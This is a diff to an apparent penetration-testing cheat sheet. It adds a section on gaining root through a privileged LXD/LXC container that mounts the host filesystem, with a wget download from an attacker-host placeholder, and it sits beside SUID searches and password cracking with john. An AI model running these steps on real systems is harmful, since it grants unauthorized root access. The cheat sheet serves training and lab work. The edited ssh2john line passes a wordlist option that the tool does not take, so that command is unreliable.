@@ -81,6 +81,18 @@ find / -perm -u=s -type f 2>/dev/null
 find / -user <USER_NAME> -type f 2>/dev/null
 ```
 
+## LXD/LXC Container Privilege Escalation
+
+```bash
+git clone https://github.com/saghul/lxd-alpine-builder.git
+wget http://<ATTACKER_IP>:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+```
+
 ## Shell Upgrade and Stabilization
 
 ```bash
@@ -192,7 +204,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt cert.hash
 ## SSH Key Hash Extraction
 
 ```bash
-/opt/john/ssh2john.py key > key.hash
+ssh2john --wordlist=/usr/share/wordlists/rockyou.txt key > key.hash
 ```
 
 # File Transfer Protocol (FTP) Operations
